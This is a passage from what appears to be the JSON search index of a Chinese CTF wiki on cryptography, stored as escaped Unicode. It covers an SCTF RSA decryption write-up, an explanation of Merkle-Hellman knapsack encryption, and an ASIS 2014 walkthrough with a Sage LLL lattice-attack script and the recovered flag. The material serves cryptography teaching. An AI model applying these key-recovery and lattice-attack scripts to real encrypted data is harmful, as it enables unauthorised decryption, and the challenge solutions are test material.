\n-------------------------\nHacked! ( hacked_d =  , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) \n-------------------------\nHacked! ( hacked_d =  , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) \n-------------------------  \u8fd9\u65f6\u6211\u4eec\u89e3\u5bc6\u5bc6\u6587\uff0c\u89e3\u5bc6\u4ee3\u7801\u5982\u4e0b  from   Crypto.PublicKey   import   RSA  from   Crypto.Cipher   import   PKCS1_v1_5 ,   PKCS1_OAEP  import   gmpy2  from   base64   import   b64decode  d   =   29897859398360008828023114464512538800655735360280670512160838259524245332403L  with   open ( ./public.key )   as   f : \n     key   =   RSA . importKey ( f ) \n     n   =   key . n \n     e   =   key . e  def   getprivatekey ( n ,   e ,   d ): \n     priviatekey   =   RSA . construct (( long ( n ),   long ( e ),   long ( d ))) \n     with   open ( private.pem ,   w )   as   f : \n         f . write ( priviatekey . exportKey ())  def   decrypt (): \n     with   open ( ./level3.passwd.enc )   as   f : \n         cipher   =   f . read () \n     with   open ( ./private.pem )   as   f : \n         key   =   RSA . importKey ( f ) \n     print   key . decrypt ( cipher )  getprivatekey ( n ,   e ,   d )  decrypt ()   \u5229\u7528\u672b\u5c3e\u7684\u5b57\u7b26\u4e32  wIe6ER1s_1TtA3k_e_t00_larg3  \u89e3\u5bc6\u538b\u7f29\u5305\uff0c\u6ce8\u610f\u53bb\u6389 B\u3002\u81f3\u6b64\u5168\u90e8\u89e3\u5bc6\u7ed3\u675f\uff0c\u5f97\u5230 flag\u3002", 
            "title": "SCTF RSA1"
        }, 
        {
            "location": "/crypto/asymmetric/knapsack/knapsack/", 
            "text": "\u80cc\u5305\u95ee\u9898\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u5148\u6765\u4ecb\u7ecd\u4e00\u4e0b\u80cc\u5305\u95ee\u9898\uff0c\u5047\u5b9a\u4e00\u4e2a\u80cc\u5305\u53ef\u4ee5\u79f0\u91cd W\uff0c\u73b0\u5728\u6709 n \u4e2a\u7269\u54c1\uff0c\u5176\u91cd\u91cf\u5206\u522b\u4e3a \na_1, a_2,...,a_n\na_1, a_2,...,a_n\n \u6211\u4eec\u60f3\u95ee\u4e00\u4e0b\u88c5\u54ea\u4e9b\u7269\u54c1\u53ef\u4ee5\u6070\u597d\u4f7f\u5f97\u80cc\u5305\u88c5\u6ee1\uff0c\u5e76\u4e14\u6bcf\u4e2a\u7269\u54c1\u53ea\u80fd\u88ab\u88c5\u4e00\u6b21\u3002\u8fd9\u5176\u5b9e\u5c31\u662f\u5728\u89e3\u8fd9\u6837\u7684\u4e00\u4e2a\u95ee\u9898\n\n\n\n\n\nx_1a_1+x_2a_2+,...,+x_na_n=W\n\n\n\n\nx_1a_1+x_2a_2+,...,+x_na_n=W\n\n\n\n\n\n\u5176\u4e2d\u6240\u6709\u7684 \nx_i\nx_i\n \u53ea\u80fd\u4e3a 0 \u548c 1\u3002\u663e\u7136\u6211\u4eec\u5fc5\u987b\u679a\u4e3e\u6240\u6709\u7684 n \u4e2a\u7269\u54c1\u7684\u7ec4\u5408\u624d\u80fd\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u800c\u590d\u6742\u5ea6\u4e5f\u5c31\u662f \n2^n\n2^n\n\uff0c\u8fd9\u4e5f\u5c31\u662f\u80cc\u5305\u52a0\u5bc6\u7684\u5999\u5904\u6240\u5728\u3002\n\n\n\u5728\u52a0\u5bc6\u65f6\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u52a0\u5bc6\u7684\u660e\u6587\u4e3a x\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u8868\u793a\u4e3a n \u4f4d\u4e8c\u8fdb\u5236\u6570\uff0c\u7136\u540e\u5206\u522b\u4e58\u4e0a \na_i\na_i\n \u5373\u53ef\u5f97\u5230\u52a0\u5bc6\u7ed3\u679c\u3002\n\n\n\u4f46\u662f\u89e3\u5bc6\u7684\u65f6\u5019\uff0c\u8be5\u600e\u4e48\u529e\u5462\uff1f\u6211\u4eec\u786e\u5b9e\u8ba9\u5176\u4ed6\u4eba\u96be\u4ee5\u89e3\u5bc6\u5bc6\u6587\uff0c\u4f46\u662f\u6211\u4eec\u81ea\u5df1\u4e5f\u786e\u5b9e\u6ca1\u6709\u529e\u6cd5\u89e3\u5bc6\u5bc6\u6587\u3002\n\n\n\u4f46\u662f\u5f53 \na_i\na_i\n \u662f\u8d85\u9012\u589e\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u6709\u529e\u6cd5\u89e3\u4e86\uff0c\u6240\u8c13\u8d85\u9012\u589e\u662f\u6307\u5e8f\u5217\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6\n\n\n\n\n\na_i\n\\sum_{k=1}^{i-1}a_k\n\n\n\n\na_i>\\sum_{k=1}^{i-1}a_k\n\n\n\n\n\n\u5373\u7b2c i \u4e2a\u6570\u5927\u4e8e\u524d\u9762\u6240\u6709\u6570\u7684\u548c\u3002\n\n\n\u4e3a\u4ec0\u4e48\u6ee1\u8db3\u8fd9\u6837\u7684\u6761\u4ef6\u5c31\u53ef\u4ee5\u89e3\u5bc6\u4e86\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u5982\u679c\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u5927\u4e8e \na_n\na_n\n \u7684\u8bdd\uff0c\u5176\u524d\u9762\u7684\u7cfb\u6570\u4e3a\u5fc5\u987b 1 \u7684\u3002\u53cd\u4e4b\uff0c\u65e0\u8bba\u5982\u4f55\u4e5f\u65e0\u6cd5\u4f7f\u5f97\u7b49\u5f0f\u6210\u7acb\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u7acb\u9a6c\u5f97\u5230\u5bf9\u5e94\u7684\u660e\u6587\u3002\n\n\n\u4f46\u662f\uff0c\u8fd9\u6837\u53c8\u51fa\u73b0\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c\u7531\u4e8e \na_i\na_i\n \u662f\u516c\u5f00\u7684\uff0c\u5982\u679c\u653b\u51fb\u8005\u622a\u83b7\u4e86\u5bc6\u6587\uff0c\u90a3\u4e48\u5b83\u4e5f\u5c31\u5f88\u5bb9\u6613\u53bb\u7834\u89e3\u8fd9\u6837\u7684\u5bc6\u7801\u3002\u4e3a\u4e86\u5f25\u8865\u8fd9\u6837\u7684\u95ee\u9898\uff0c\u5c31\u51fa\u73b0\u4e86 Merkle\u2013Hellman \u8fd9\u6837\u7684\u52a0\u5bc6\u7b97\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u521d\u59cb\u7684\u80cc\u5305\u96c6\u4f5c\u4e3a\u79c1\u94a5\uff0c\u53d8\u6362\u540e\u7684\u80cc\u5305\u96c6\u4f5c\u4e3a\u516c\u94a5\uff0c\u518d\u7a0d\u5fae\u6539\u52a8\u52a0\u5bc6\u8fc7\u7a0b\uff0c\u5373\u53ef\u3002\n\n\n\u8fd9\u91cc\u867d\u7136\u8bf4\u4e86\u8d85\u9012\u589e\u5e8f\u5217\uff0c\u4f46\u662f\u5374\u6ca1\u6709\u8bf4\u662f\u5982\u4f55\u751f\u6210\u7684\u3002\n\n\nMerkle\u2013Hellman\n\n\n\u516c\u79c1\u94a5\u751f\u6210\n\n\n\u751f\u6210\u79c1\u94a5\n\n\n\u79c1\u94a5\u5c31\u662f\u6211\u4eec\u7684\u521d\u59cb\u7684\u80cc\u5305\u96c6\uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u8d85\u9012\u589e\u5e8f\u5217\uff0c\u600e\u4e48\u751f\u6210\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u5047\u8bbe \na_1=1\na_1=1\n\uff0c\u90a3\u4e48 \na_2\na_2\n \u5927\u4e8e 1 \u5373\u53ef\uff0c\u7c7b\u4f3c\u7684\u53ef\u4ee5\u4f9d\u6b21\u751f\u6210\u540e\u9762\u7684\u503c\u3002\n\n\n\u751f\u6210\u516c\u94a5\n\n\n\u5728\u751f\u6210\u516c\u94a5\u7684\u8fc7\u7a0b\u4e2d\u4e3b\u8981\u4f7f\u7528\u4e86\u6a21\u4e58\u7684\u8fd0\u7b97\u3002\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u751f\u6210\u6a21\u4e58\u7684\u6a21\u6570 m\uff0c\u8fd9\u91cc\u8981\u786e\u4fdd\n\n\n\n\n\nm\n\\sum_{i=1}^{i=n}a_i\n\n\n\n\nm>\\sum_{i=1}^{i=n}a_i\n\n\n\n\n\n\u5176\u6b21\uff0c\u6211\u4eec\u9009\u62e9\u6a21\u4e58\u7684\u4e58\u6570 w\uff0c\u4f5c\u4e3a\u79c1\u94a5\u5e76\u4e14\u786e\u4fdd\n\n\n\n\n\ngcd(w,m)=1\n\n\n\n\ngcd(w,m)=1\n\n\n\n\n\n\u4e4b\u540e\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u516c\u5f0f\u751f\u6210\u516c\u94a5\n\n\n\n\n\nb_i \\equiv w a_i \\bmod m\n\n\n\n\nb_i \\equiv w a_i \\bmod m\n\n\n\n\n\n\u5e76\u5c06\u8fd9\u4e2a\u65b0\u7684\u80cc\u5305\u96c6 \nb_i\nb_i\n \u548c m \u4f5c\u4e3a\u516c\u94a5\u3002\n\n\n\u52a0\u89e3\u5bc6\n\n\n\u52a0\u5bc6\n\n\n\u5047\u8bbe\u6211\u4eec\u8981\u52a0\u5bc6\u7684\u660e\u6587\u4e3a v\uff0c\u5176\u6bcf\u4e00\u4e2a\u6bd4\u7279\u4f4d\u4e3a \nv_i\nv_i\n\uff0c\u90a3\u4e48\u6211\u4eec\u52a0\u5bc6\u7684\u7ed3\u679c\u4e3a\n\n\n\n\n\n\\sum_{i=1}^{i=n}b_iv_i \\bmod m\n\n\n\n\n\\sum_{i=1}^{i=n}b_iv_i \\bmod m\n\n\n\n\n\n\u89e3\u5bc6\n\n\n\u5bf9\u4e8e\u89e3\u5bc6\u65b9\uff0c\u9996\u5148\u53ef\u4ee5\u6c42\u7684 w \u5173\u4e8e m \u7684\u9006\u5143 \nw^{-1}\nw^{-1}\n\u3002\n\n\n\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u5c06\u5f97\u5230\u7684\u5bc6\u6587\u4e58\u4ee5 \nw^{-1}\nw^{-1}\n \u5373\u53ef\u5f97\u5230\u660e\u6587\uff0c\u8fd9\u662f\u56e0\u4e3a\n\n\n\n\n\n\\sum_{i=1}^{i=n}w^{-1}b_iv_i \\bmod m=\\sum_{i=1}^{i=n}a_iv_i \\bmod m\n\n\n\n\n\\sum_{i=1}^{i=n}w^{-1}b_iv_i \\bmod m=\\sum_{i=1}^{i=n}a_iv_i \\bmod m\n\n\n\n\n\n\u8fd9\u91cc\u6709\n\n\n\n\n\nb_i \\equiv w a_i \\bmod m\n\n\n\n\nb_i \\equiv w a_i \\bmod m\n\n\n\n\n\n\u5bf9\u4e8e\u6bcf\u4e00\u5757\u7684\u52a0\u5bc6\u7684\u6d88\u606f\u90fd\u662f\u5c0f\u4e8e m \u7684\uff0c\u6240\u4ee5\u6c42\u5f97\u7ed3\u679c\u81ea\u7136\u4e5f\u5c31\u662f\u660e\u6587\u4e86\u3002\n\n\n\u7834\u89e3\n\n\n\u8be5\u52a0\u5bc6\u4f53\u5236\u5728\u63d0\u51fa\u540e\u4e24\u5e74\u540e\u8be5\u4f53\u5236\u5373\u88ab\u7834\u8bd1\uff0c\u7834\u8bd1\u7684\u57fa\u672c\u601d\u60f3\u662f\u6211\u4eec\u4e0d\u4e00\u5b9a\u8981\u627e\u51fa\u6b63\u786e\u7684\u4e58\u6570 w\uff08\u5373\u9677\u95e8\u4fe1\u606f\uff09\uff0c\u53ea\u9700\u627e\u51fa\u4efb\u610f\u6a21\u6570 \nm\u2032\n \u548c\u4e58\u6570 \nw\u2032\n\uff0c\u53ea\u8981\u4f7f\u7528 \nw\u2032\n \u53bb\u4e58\u516c\u5f00\u7684\u80cc\u5305\u5411\u91cf B \u65f6\uff0c\u80fd\u591f\u4ea7\u751f\u8d85\u9012\u589e\u7684\u80cc\u5305\u5411\u91cf\u5373\u53ef\u3002\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5 2014 \u5e74 ASIS Cyber Security Contest Quals \u4e2d\u7684 Archaic \u4e3a\u4f8b\uff0c\n\u9898\u76ee\u94fe\u63a5\n\u3002\n\n\n\u9996\u5148\u67e5\u770b\u6e90\u7a0b\u5e8f\n\n\nsecret\n \n=\n \nCENSORED\n\n\nmsg_bit\n \n=\n \nbin\n(\nint\n(\nsecret\n.\nencode\n(\nhex\n),\n \n16\n))[\n2\n:]\n\n\n\n\n\n\u9996\u5148\u5f97\u5230\u4e86 secret \u7684\u6240\u6709\u4e8c\u8fdb\u5236\u4f4d\u3002\n\n\n\u5176\u6b21\uff0c\u5229\u7528\u5982\u4e0b\u51fd\u6570\u5f97\u5230 keypair\uff0c\u5305\u542b\u516c\u94a5\u4e0e\u79c1\u94a5\u3002\n\n\nkeyPair\n \n=\n \nmakeKey\n(\nlen\n(\nmsg_bit\n))\n\n\n\n\n\n\u4ed4\u7ec6\u5206\u6790 makekey \u51fd\u6570\uff0c\u5982\u4e0b\n\n\ndef\n \nmakeKey\n(\nn\n):\n\n    \nprivKey\n \n=\n \n[\nrandom\n.\nrandint\n(\n1\n,\n \n4\n**\nn\n)]\n\n    \ns\n \n=\n \nprivKey\n[\n0\n]\n\n    \nfor\n \ni\n \nin\n \nrange\n(\n1\n,\n \nn\n):\n\n        \nprivKey\n.\nappend\n(\nrandom\n.\nrandint\n(\ns\n \n+\n \n1\n,\n \n4\n**\n(\nn\n \n+\n \ni\n)))\n\n        \ns\n \n+=\n \nprivKey\n[\ni\n]\n\n    \nq\n \n=\n \nrandom\n.\nrandint\n(\nprivKey\n[\nn\n-\n1\n]\n \n+\n \n1\n,\n \n2\n*\nprivKey\n[\nn\n-\n1\n])\n\n    \nr\n \n=\n \nrandom\n.\nrandint\n(\n1\n,\n \nq\n)\n\n    \nwhile\n \ngmpy2\n.\ngcd\n(\nr\n,\n \nq\n)\n \n!=\n \n1\n:\n\n        \nr\n \n=\n \nrandom\n.\nrandint\n(\n1\n,\n \nq\n)\n\n    \npubKey\n \n=\n \n[\n \nr\n*\nw\n \n%\n \nq\n \nfor\n \nw\n \nin\n \nprivKey\n \n]\n\n    \nreturn\n \nprivKey\n,\n \nq\n,\n \nr\n,\n \npubKey\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa prikey \u662f\u4e00\u4e2a\u8d85\u9012\u589e\u5e8f\u5217\uff0c\u5e76\u4e14\u5f97\u5230\u7684 q \u6bd4 prikey \u4e2d\u6240\u6709\u6570\u7684\u548c\u8fd8\u8981\u5927\uff0c\u6b64\u5916\u6211\u4eec\u5f97\u5230\u7684 r\uff0c\u6070\u597d\u4e0e q \u4e92\u7d20\uff0c\u8fd9\u4e00\u5207\u90fd\u8868\u660e\u4e86\u8be5\u52a0\u5bc6\u662f\u4e00\u4e2a\u80cc\u5305\u52a0\u5bc6\u3002\n\n\n\u679c\u7136\u52a0\u5bc6\u51fd\u6570\u5c31\u662f\u5bf9\u4e8e\u6d88\u606f\u7684\u6bcf\u4e00\u4f4d\u4e58\u4ee5\u5bf9\u5e94\u7684\u516c\u94a5\u5e76\u6c42\u548c\u3002\n\n\ndef\n \nencrypt\n(\nmsg\n,\n \npubKey\n):\n\n    \nmsg_bit\n \n=\n \nmsg\n\n    \nn\n \n=\n \nlen\n(\npubKey\n)\n\n    \ncipher\n \n=\n \n0\n\n    \ni\n \n=\n \n0\n\n    \nfor\n \nbit\n \nin\n \nmsg_bit\n:\n\n        \ncipher\n \n+=\n \nint\n(\nbit\n)\n*\npubKey\n[\ni\n]\n\n        \ni\n \n+=\n \n1\n\n    \nreturn\n \nbin\n(\ncipher\n)[\n2\n:]\n\n\n\n\n\n\u5bf9\u4e8e\u7834\u89e3\u7684\u811a\u672c\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 \nGitHub\n \u4e0a\u7684\u811a\u672c\u3002\u8fdb\u884c\u4e00\u4e9b\u7b80\u5355\u7684\u4fee\u6539\u3002\n\n\nimport\n \nbinascii\n\n\n# open the public key and strip the spaces so we have a decent array\n\n\nfileKey\n \n=\n \nopen\n(\npub.Key\n,\n \nrb\n)\n\n\npubKey\n \n=\n \nfileKey\n.\nread\n()\n.\nreplace\n(\n \n,\n \n)\n.\nreplace\n(\nL\n,\n \n)\n.\nstrip\n(\n[]\n)\n.\nsplit\n(\n,\n)\n\n\nnbit\n \n=\n \nlen\n(\npubKey\n)\n\n\n# open the encoded message\n\n\nfileEnc\n \n=\n \nopen\n(\nenc.txt\n,\n \nrb\n)\n\n\nencoded\n \n=\n \nfileEnc\n.\nread\n()\n.\nreplace\n(\nL\n,\n \n)\n\n\nprint\n \nstart\n\n\n# create a large matrix of 0\ns (dimensions are public key length +1)\n\n\nA\n \n=\n \nMatrix\n(\nZZ\n,\n \nnbit\n \n+\n \n1\n,\n \nnbit\n \n+\n \n1\n)\n\n\n# fill in the identity matrix\n\n\nfor\n \ni\n \nin\n \nxrange\n(\nnbit\n):\n\n    \nA\n[\ni\n,\n \ni\n]\n \n=\n \n1\n\n\n# replace the bottom row with your public key\n\n\nfor\n \ni\n \nin\n \nxrange\n(\nnbit\n):\n\n    \nA\n[\ni\n,\n \nnbit\n]\n \n=\n \npubKey\n[\ni\n]\n\n\n# last element is the encoded message\n\n\nA\n[\nnbit\n,\n \nnbit\n]\n \n=\n \n-\nint\n(\nencoded\n)\n\n\n\nres\n \n=\n \nA\n.\nLLL\n()\n\n\nfor\n \ni\n \nin\n \nrange\n(\n0\n,\n \nnbit\n \n+\n \n1\n):\n\n    \n# print solution\n\n    \nM\n \n=\n \nres\n.\nrow\n(\ni\n)\n.\nlist\n()\n\n    \nflag\n \n=\n \nTrue\n\n    \nfor\n \nm\n \nin\n \nM\n:\n\n        \nif\n \nm\n \n!=\n \n0\n \nand\n \nm\n \n!=\n \n1\n:\n\n            \nflag\n \n=\n \nFalse\n\n            \nbreak\n\n    \nif\n \nflag\n:\n\n        \nprint\n \ni\n,\n \nM\n\n        \nM\n \n=\n \n.\njoin\n(\nstr\n(\nj\n)\n \nfor\n \nj\n \nin\n \nM\n)\n\n        \n# remove the last bit\n\n        \nM\n \n=\n \nM\n[:\n-\n1\n]\n\n        \nM\n \n=\n \nhex\n(\nint\n(\nM\n,\n \n2\n))[\n2\n:\n-\n1\n]\n\n        \nprint\n \nM\n\n\n\n\n\n\u8f93\u51fa\u4e4b\u540e\u518d\u89e3\u7801\u4e0b\n\n\n295\n \n[\n1\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n0\n,\n \n1\n,\n \n0\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n0\n,\n \n1\n,\n \n0\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n1\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n1\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n1\n,\n \n0\n,\n \n1\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n1\n,\n \n0\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n1\n,\n \n1\n,\n \n0\n,\n \n0\n,\n \n1\n,\n \n0\n,\n \n1\n,\n \n0\n]\n\n\n415349535\nf3962643364356664323432323638326331393536383830366130373036316365\n\n\n \nimport\n \nbinascii\n\n\n \nbinascii\n.\nunhexlify\n(\n415349535f3962643364356664323432323638326331393536383830366130373036316365\n)\n\n\nASIS_9bd3d5fd2422682c19568806a07061ce\n\n\n\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u5f97\u5230\u7684 LLL \u653b\u51fb\u5f97\u5230\u7684\u77e9\u9635 res \u7684\u53ea\u5305\u542b 01 \u503c\u7684\u884c\u624d\u662f\u6211\u4eec\u60f3\u8981\u7684\u7ed3\u679c\uff0c\u56e0\u4e3a\u6211\u4eec\u5bf9\u4e8e\u660e\u6587\u52a0\u5bc6\u65f6\uff0c\u4f1a\u5c06\u5176\u5206\u89e3\u4e3a\u4e8c\u8fdb\u5236\u6bd4\u7279\u4e32\u3002\u6b64\u5916\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u53bb\u6389\u5bf9\u5e94\u54ea\u4e00\u884c\u7684\u6700\u540e\u4e00\u4e2a\u6570\u5b57\u3002\n\n\nflag \u662f \nASIS_9bd3d5fd2422682c19568806a07061ce\n\u3002\n\n\n\u9898\u76ee\n\n\n\n\n2017 \u56fd\u8d5b classic", 
            "title": "\u80cc\u5305\u52a0\u5bc6"
        }, 
        {
            "location": "/crypto/asymmetric/knapsack/knapsack/#_1", 
            "text": "\u9996\u5148\uff0c\u6211\u4eec\u5148\u6765\u4ecb\u7ecd\u4e00\u4e0b\u80cc\u5305\u95ee\u9898\uff0c\u5047\u5b9a\u4e00\u4e2a\u80cc\u5305\u53ef\u4ee5\u79f0\u91cd W\uff0c\u73b0\u5728\u6709 n \u4e2a\u7269\u54c1\uff0c\u5176\u91cd\u91cf\u5206\u522b\u4e3a  a_1, a_2,...,a_n a_1, a_2,...,a_n  \u6211\u4eec\u60f3\u95ee\u4e00\u4e0b\u88c5\u54ea\u4e9b\u7269\u54c1\u53ef\u4ee5\u6070\u597d\u4f7f\u5f97\u80cc\u5305\u88c5\u6ee1\uff0c\u5e76\u4e14\u6bcf\u4e2a\u7269\u54c1\u53ea\u80fd\u88ab\u88c5\u4e00\u6b21\u3002\u8fd9\u5176\u5b9e\u5c31\u662f\u5728\u89e3\u8fd9\u6837\u7684\u4e00\u4e2a\u95ee\u9898   \nx_1a_1+x_2a_2+,...,+x_na_n=W  \nx_1a_1+x_2a_2+,...,+x_na_n=W   \u5176\u4e2d\u6240\u6709\u7684  x_i x_i  \u53ea\u80fd\u4e3a 0 \u548c 1\u3002\u663e\u7136\u6211\u4eec\u5fc5\u987b\u679a\u4e3e\u6240\u6709\u7684 n \u4e2a\u7269\u54c1\u7684\u7ec4\u5408\u624d\u80fd\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u800c\u590d\u6742\u5ea6\u4e5f\u5c31\u662f  2^n 2^n \uff0c\u8fd9\u4e5f\u5c31\u662f\u80cc\u5305\u52a0\u5bc6\u7684\u5999\u5904\u6240\u5728\u3002  \u5728\u52a0\u5bc6\u65f6\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u52a0\u5bc6\u7684\u660e\u6587\u4e3a x\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u8868\u793a\u4e3a n \u4f4d\u4e8c\u8fdb\u5236\u6570\uff0c\u7136\u540e\u5206\u522b\u4e58\u4e0a  a_i a_i  \u5373\u53ef\u5f97\u5230\u52a0\u5bc6\u7ed3\u679c\u3002  \u4f46\u662f\u89e3\u5bc6\u7684\u65f6\u5019\uff0c\u8be5\u600e\u4e48\u529e\u5462\uff1f\u6211\u4eec\u786e\u5b9e\u8ba9\u5176\u4ed6\u4eba\u96be\u4ee5\u89e3\u5bc6\u5bc6\u6587\uff0c\u4f46\u662f\u6211\u4eec\u81ea\u5df1\u4e5f\u786e\u5b9e\u6ca1\u6709\u529e\u6cd5\u89e3\u5bc6\u5bc6\u6587\u3002  \u4f46\u662f\u5f53  a_i a_i  \u662f\u8d85\u9012\u589e\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u6709\u529e\u6cd5\u89e3\u4e86\uff0c\u6240\u8c13\u8d85\u9012\u589e\u662f\u6307\u5e8f\u5217\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6   \na_i \\sum_{k=1}^{i-1}a_k  \na_i>\\sum_{k=1}^{i-1}a_k   \u5373\u7b2c i \u4e2a\u6570\u5927\u4e8e\u524d\u9762\u6240\u6709\u6570\u7684\u548c\u3002  \u4e3a\u4ec0\u4e48\u6ee1\u8db3\u8fd9\u6837\u7684\u6761\u4ef6\u5c31\u53ef\u4ee5\u89e3\u5bc6\u4e86\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u5982\u679c\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u5927\u4e8e  a_n a_n  \u7684\u8bdd\uff0c\u5176\u524d\u9762\u7684\u7cfb\u6570\u4e3a\u5fc5\u987b 1 \u7684\u3002\u53cd\u4e4b\uff0c\u65e0\u8bba\u5982\u4f55\u4e5f\u65e0\u6cd5\u4f7f\u5f97\u7b49\u5f0f\u6210\u7acb\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u7acb\u9a6c\u5f97\u5230\u5bf9\u5e94\u7684\u660e\u6587\u3002  \u4f46\u662f\uff0c\u8fd9\u6837\u53c8\u51fa\u73b0\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c\u7531\u4e8e  a_i a_i  \u662f\u516c\u5f00\u7684\uff0c\u5982\u679c\u653b\u51fb\u8005\u622a\u83b7\u4e86\u5bc6\u6587\uff0c\u90a3\u4e48\u5b83\u4e5f\u5c31\u5f88\u5bb9\u6613\u53bb\u7834\u89e3\u8fd9\u6837\u7684\u5bc6\u7801\u3002\u4e3a\u4e86\u5f25\u8865\u8fd9\u6837\u7684\u95ee\u9898\uff0c\u5c31\u51fa\u73b0\u4e86 Merkle\u2013Hellman 